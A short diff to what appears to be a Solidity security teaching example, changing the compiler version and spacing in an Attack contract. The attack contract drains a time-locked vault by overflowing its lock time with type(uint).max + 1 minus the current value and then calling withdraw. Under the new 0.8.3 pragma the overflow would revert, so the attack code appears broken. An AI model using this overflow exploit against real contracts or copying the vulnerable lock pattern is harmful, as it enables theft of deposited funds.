@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.7.6;
+pragma solidity ^0.8.3;
 
 // This contract is designed to act as a time vault.
 // User can deposit into this contract but cannot withdraw for atleast a week.
@@ -60,7 +60,7 @@ contract Attack {
         so x = type(uint).max + 1 - t
         */
         timeLock.increaseLockTime(
-            type(uint).max + 1- timeLock.lockTime(address(this))
+            type(uint).max + 1 - timeLock.lockTime(address(this))
         );
         timeLock.withdraw();
     }
